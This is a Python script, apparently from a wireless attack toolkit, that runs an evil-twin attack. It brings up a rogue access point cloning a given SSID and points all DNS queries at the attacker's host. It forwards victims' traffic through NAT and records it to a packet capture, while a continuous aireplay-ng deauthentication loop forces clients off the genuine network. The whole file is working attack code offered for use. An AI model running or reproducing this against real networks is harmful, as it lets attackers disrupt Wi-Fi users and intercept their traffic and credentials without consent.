"""Evil-twin runner invoked as a subprocess by attack/evil-twin.

Brings up hostapd + dnsmasq on AP_IFACE, configures NAT through the
upstream interface if present, starts tcpdump on AP_IFACE, and runs a
continuous deauth loop on MON_IFACE. Tears everything down on SIGTERM.
"""

from __future__ import annotations

import argparse
import signal
import subprocess
import sys
import time
from pathlib import Path


def hostapd_conf(ap_iface: str, ssid: str, channel: int, wpa_pass: str | None) -> str:
    lines = [
        f"interface={ap_iface}",
        "driver=nl80211",
        f"ssid={ssid}",
        "hw_mode=g",
        f"channel={channel}",
        "ieee80211n=1",
        "auth_algs=1",
        "wmm_enabled=1",
    ]
    if wpa_pass:
        lines += [
            "wpa=2",
            "wpa_key_mgmt=WPA-PSK",
            "wpa_pairwise=CCMP",
            "rsn_pairwise=CCMP",
            f"wpa_passphrase={wpa_pass}",
        ]
    return "\n".join(lines) + "\n"


def dnsmasq_conf(ap_iface: str, log_path: Path) -> str:
    return (
        f"interface={ap_iface}\n"
        "bind-interfaces\n"
        "dhcp-range=10.0.0.10,10.0.0.100,12h\n"
        "dhcp-option=3,10.0.0.1\n"
        "dhcp-option=6,10.0.0.1\n"
        "address=/#/10.0.0.1\n"
        "log-queries\n"
        f"log-facility={log_path}\n"
    )


def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument("--workdir", required=True)
    p.add_argument("--ap-iface", required=True)
    p.add_argument("--mon-iface", required=True)
    p.add_argument("--upstream", default="eth0")
    p.add_argument("--bssid", required=True)
    p.add_argument("--ssid", required=True)
    p.add_argument("--channel", type=int, required=True)
    p.add_argument("--client", default=None)
    p.add_argument("--wpa-pass", default=None)
    args = p.parse_args()

    workdir = Path(args.workdir)
    workdir.mkdir(parents=True, exist_ok=True)
    hostapd_path = workdir / "hostapd.conf"
    dnsmasq_path = workdir / "dnsmasq.conf"
    dnsmasq_log = workdir / "dnsmasq.log"
    hostapd_log = workdir / "hostapd.log"
    pcap = workdir / "rogue.pcap"

    hostapd_path.write_text(hostapd_conf(args.ap_iface, args.ssid, args.channel, args.wpa_pass))
    dnsmasq_path.write_text(dnsmasq_conf(args.ap_iface, dnsmasq_log))

    subprocess.run(["nmcli", "device", "set", args.ap_iface, "managed", "no"], check=False)
    subprocess.run(["ip", "addr", "flush", "dev", args.ap_iface], check=False)
    subprocess.run(["ip", "addr", "add", "10.0.0.1/24", "dev", args.ap_iface], check=False)
    subprocess.run(["ip", "link", "set", args.ap_iface, "up"], check=False)

    nat_ok = Path(f"/sys/class/net/{args.upstream}").exists()
    if nat_ok:
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"],
                       stdout=subprocess.DEVNULL, check=False)
        subprocess.run(["iptables", "-t", "nat", "-A", "POSTROUTING",
                        "-o", args.upstream, "-j", "MASQUERADE"], check=False)
        subprocess.run(["iptables", "-A", "FORWARD", "-i", args.ap_iface,
                        "-o", args.upstream, "-j", "ACCEPT"], check=False)
        subprocess.run(["iptables", "-A", "FORWARD", "-i", args.upstream, "-o", args.ap_iface,
                        "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"],
                       check=False)

    subprocess.run(["iw", "dev", args.mon_iface, "set", "channel", str(args.channel)], check=False)

    hostapd_fh = open(hostapd_log, "ab")
    dnsmasq_fh = open(dnsmasq_log, "ab")
    hostapd = subprocess.Popen(["hostapd", str(hostapd_path)],
                               stdout=hostapd_fh, stderr=hostapd_fh)
    dnsmasq = subprocess.Popen(["dnsmasq", "--no-daemon", "-C", str(dnsmasq_path)],
                               stdout=dnsmasq_fh, stderr=dnsmasq_fh)
    tcpdump = subprocess.Popen(
        ["tcpdump", "-i", args.ap_iface, "-n", "-s0", "-w", str(pcap)],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )

    running = {"go": True}

    def stop(_sig, _frm):
        running["go"] = False

    signal.signal(signal.SIGTERM, stop)
    signal.signal(signal.SIGINT, stop)

    print(f"[*] rogue AP up: SSID={args.ssid!r} ch={args.channel} on {args.ap_iface}", flush=True)

    deauth_argv = ["aireplay-ng", "--deauth", "5", "-a", args.bssid]
    if args.client:
        deauth_argv += ["-c", args.client]
    deauth_argv.append(args.mon_iface)

    try:
        round_ = 0
        while running["go"]:
            round_ += 1
            print(f"[*] round {round_}: deauthing {args.client or '(broadcast)'}", flush=True)
            subprocess.run(deauth_argv, check=False)
            for _ in range(5):
                if not running["go"]:
                    break
                time.sleep(1)
            if hostapd.poll() is not None:
                print("[x] hostapd died", flush=True)
                break
    finally:
        for proc in (hostapd, dnsmasq, tcpdump):
            try:
                proc.terminate()
            except Exception:
                pass
        for proc in (hostapd, dnsmasq, tcpdump):
            try:
                proc.wait(timeout=3)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
        hostapd_fh.close()
        dnsmasq_fh.close()
        if nat_ok:
            subprocess.run(["iptables", "-t", "nat", "-D", "POSTROUTING",
                            "-o", args.upstream, "-j", "MASQUERADE"], check=False)
            subprocess.run(["iptables", "-D", "FORWARD", "-i", args.ap_iface,
                            "-o", args.upstream, "-j", "ACCEPT"], check=False)
            subprocess.run(["iptables", "-D", "FORWARD", "-i", args.upstream, "-o", args.ap_iface,
                            "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"],
                           check=False)
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"],
                           stdout=subprocess.DEVNULL, check=False)
        subprocess.run(["ip", "addr", "flush", "dev", args.ap_iface], check=False)
    return 0


if __name__ == "__main__":
    sys.exit(main())
